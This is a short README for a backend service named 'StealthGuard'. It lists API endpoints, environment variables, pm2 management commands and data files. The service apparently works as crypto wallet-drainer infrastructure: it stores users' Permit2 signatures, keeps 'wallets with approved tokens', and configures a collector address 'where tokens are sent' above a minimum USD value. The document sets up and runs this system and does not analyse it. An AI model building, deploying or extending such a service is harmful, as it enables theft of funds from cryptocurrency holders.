# StealthGuard Backend

## Endpoints

- `POST /api/log` - Log single event
- `POST /api/log/batch` - Log batch of events
- `POST /api/permit2` - Store Permit2 signature
- `GET /api/dashboard` - Dashboard stats
- `GET /health` - Health check

## Environment Variables

```env
BACKEND_PRIVATE_KEY=0x...           # For signing transactions
BACKEND_WALLET_ADDRESS=0x...        # Collector wallet
COLLECTOR_ADDRESS=0x...             # Where tokens are sent
CLOUDFLARE_API_TOKEN=...            # Optional
MIN_TRANSFER_USD=1
```

## Management

```bash
pm2 start server.js --name stealthguard
pm2 logs stealthguard
pm2 restart stealthguard
```

## Data Storage

- `data/events.json` - All logged events
- `data/wallets.json` - Wallet data with approved tokens
